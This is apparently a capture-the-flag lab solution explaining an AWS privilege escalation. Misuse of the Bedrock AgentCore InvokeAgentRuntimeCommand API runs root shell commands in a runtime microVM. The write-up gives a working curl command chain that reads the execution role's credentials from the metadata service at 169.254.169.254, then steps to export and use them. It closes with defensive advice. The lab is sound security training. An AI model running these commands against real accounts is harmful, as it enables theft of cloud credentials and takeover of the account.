# Solution: AgentCore Runtime Command Injection to Admin

The bedrock-004 path is the most direct of the AgentCore privilege escalation family. Where bedrock-001 requires creating a new Runtime from scratch (and therefore needs `iam:PassRole`), and bedrock-002 requires starting a code interpreter session and then invoking Python through it, bedrock-004 collapses the entire attack to a single API call: `bedrock-agentcore:InvokeAgentRuntimeCommand`. One permission, one request, full admin.

The technique targets AgentCore Runtimes (and the closely related Harnesses) — managed execution environments for AI agents that run on Firecracker microVMs. The `InvokeAgentRuntimeCommand` API was designed to let operators run diagnostic shell commands inside the microVM alongside the customer's agent process, bypassing the agent, the model, and any guardrails entirely. It runs as root. Because the microVM hosts the runtime's execution role, those root-level shell commands can reach the MicroVM Metadata Service at `169.254.169.254` and read out live temporary credentials for whatever IAM role was attached when the runtime was created.

This is why the attack is classified as "existing-passrole" rather than requiring a fresh `iam:PassRole`: the attacker targets a resource that was already misconfigured by someone else. As long as a Runtime or Harness exists with a privileged IAM role and IAM Inbound Auth enabled, one developer-tier permission is enough. JWT-authenticated runtimes are immune — only IAM-authenticated resources expose the command channel.

The risk is significant because teams building Bedrock AI agents legitimately need operational access to their runtimes, and `InvokeAgentRuntimeCommand` is the natural "run a debug command" permission. Without tight resource scoping, a single overly broad policy grants an attacker the ability to exfiltrate credentials from every runtime in the account in seconds.

## The Challenge

You start as `pl-prod-bedrock-004-to-admin-starting-user`, a low-privilege IAM user with one meaningful permission: `bedrock-agentcore:InvokeAgentRuntimeCommand` scoped to `*`. There is no `iam:PassRole`, no `bedrock-agentcore:CreateAgentRuntime`, no Lambda, nothing else interesting. The attack does not require creating any AWS resources.

Your target is `pl-prod-bedrock-004-to-admin-target-role`, an IAM role with `AdministratorAccess` that is already attached as the execution role for the `pl-prod-bedrock-004-to-admin-target-runtime` AgentCore Runtime. That runtime was deployed by Terraform and is sitting in READY state with IAM Inbound Auth, waiting.

Start by loading your credentials from the Terraform outputs:

```bash
cd /path/to/pathfinding-labs
MODULE_OUTPUT=$(terraform output -json | jq -r '.single_account_privesc_one_hop_to_admin_bedrock_004_bedrockagentcore_invokeagentcommand.value')
export AWS_ACCESS_KEY_ID=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_access_key_id')
export AWS_SECRET_ACCESS_KEY=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_secret_access_key')
unset AWS_SESSION_TOKEN
RUNTIME_ID=$(echo "$MODULE_OUTPUT" | jq -r '.target_runtime_id')
```

Verify your identity:

```bash
aws sts get-caller-identity
# Returns: pl-prod-bedrock-004-to-admin-starting-user
```

## Reconnaissance

Before touching the runtime, confirm you're starting from nothing:

```bash
aws iam list-users --max-items 1
# AccessDenied — no admin access yet
```

If you have the helpful `bedrock-agentcore:ListAgentRuntimes` permission, enumerate what's deployed:

```bash
aws bedrock-agentcore list-agent-runtimes
```

You'll see `pl-prod-bedrock-004-to-admin-target-runtime` in the output. Now confirm the two things that make it exploitable — its execution role and its Inbound Auth type:

```bash
aws bedrock-agentcore get-agent-runtime \
  --agent-runtime-id pl-prod-bedrock-004-to-admin-target-runtime
```

The response will show the execution role ARN (`pl-prod-bedrock-004-to-admin-target-role`) and that `inboundAuthType` is set to `IAM`. That's your confirmation: the role is privileged, the auth type is vulnerable, the runtime is in READY state. You have everything you need.

In a real engagement you'd cross-reference the execution role ARN against IAM to understand what it can do — a quick `iam:GetRole` or `iam:ListAttachedRolePolicies` call reveals the AdministratorAccess attachment.

## Exploitation

This is where bedrock-004 diverges sharply from the other paths in the family. There's no session to start, no interpreter to invoke, no Python to write. You send one request.

`InvokeAgentRuntimeCommand` accepts a shell command string and runs it as root inside the runtime's Firecracker microVM. The output comes back in the streaming response body. You're going to use it to query the MicroVM Metadata Service (MMDS) — the same metadata endpoint that EC2 uses, exposed to anything running inside the VM — and dump the execution role's temporary credentials.

The MMDS follows the IMDSv2 flow: first request a session token with a PUT, then use that token to read the credentials:

```bash
aws bedrock-agentcore invoke-agent-runtime-command \
  --agent-runtime-id pl-prod-bedrock-004-to-admin-target-runtime \
  --command 'TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" \
    -H "X-aws-ec2-metadata-token-ttl-seconds: 21600") \
    && ROLE=$(curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
    http://169.254.169.254/latest/meta-data/iam/security-credentials/) \
    && curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
    http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE'
```

The command runs as root, reaches the metadata service, discovers the role name at the first credentials path, and fetches the full credential document from the role-specific path. The streaming response includes a payload containing your output:

```json
{
  "AccessKeyId": "ASIA...",
  "SecretAccessKey": "...",
  "Token": "...",
  "Expiration": "2026-..."
}
```

Extract those three values and export them:

```bash
export AWS_ACCESS_KEY_ID="ASIA..."
export AWS_SECRET_ACCESS_KEY="..."
export AWS_SESSION_TOKEN="..."
```

You are now operating as `pl-prod-bedrock-004-to-admin-target-role`.

## Verification

Confirm the new identity:

```bash
aws sts get-caller-identity
# Returns: pl-prod-bedrock-004-to-admin-target-role
```

Prove admin access with something the starting user could never do:

```bash
aws iam list-users --max-items 3
```

If you see a list of IAM users, the escalation worked. You went from one low-privilege API permission to full account administrator in a single API call.

## Capture the Flag

With administrative credentials in your environment, read the CTF flag from SSM Parameter Store. The `AdministratorAccess` managed policy attached to `pl-prod-bedrock-004-to-admin-target-role` includes `ssm:GetParameter` on all resources, so this is a straight read:

```bash
aws ssm get-parameter \
  --name /pathfinding-labs/flags/bedrock-004-to-admin \
  --query 'Parameter.Value' \
  --output text
```

The parameter path follows the standard Pathfinding Labs convention: `/pathfinding-labs/flags/<scenario-id>`. Because you are currently operating as the admin role (your environment variables hold its temporary credentials from MMDS), the call succeeds and returns the flag value. That value is the proof of end-to-end exploitation.

## What Happened

You started with a single permission — `bedrock-agentcore:InvokeAgentRuntimeCommand` — and ended with full account administrator access. No resources created, no IAM modifications, no PassRole dance. The attack required exactly one API call.

The underlying pattern is the same one that makes `ssm:StartSession` on a privileged EC2 instance dangerous, or `codebuild:StartBuild` on a privileged CodeBuild project: **access an existing compute resource that already carries elevated permissions, reach the metadata service from inside it, and extract those credentials.** The difference with AgentCore is that `InvokeAgentRuntimeCommand` skips even the session setup — it gives you direct shell execution in a single synchronous call, making it the most streamlined MMDS exfiltration path in the Bedrock family.

The critical defensive insight is that restricting `iam:PassRole` is not sufficient here. The targeted runtime was already configured with a privileged role by someone else — a developer, a Terraform module, an automation pipeline. The attacker didn't need to attach anything. Organizations that carefully audit PassRole grants and new resource creation events can still be blindsided by this technique if they treat `InvokeAgentRuntimeCommand` as a benign operational permission. The action should be treated with the same gravity as `ssm:StartSession` on privileged instances: scope it to specific non-privileged resources, deny it at the SCP level for everything else, and alert immediately on any unexpected caller.
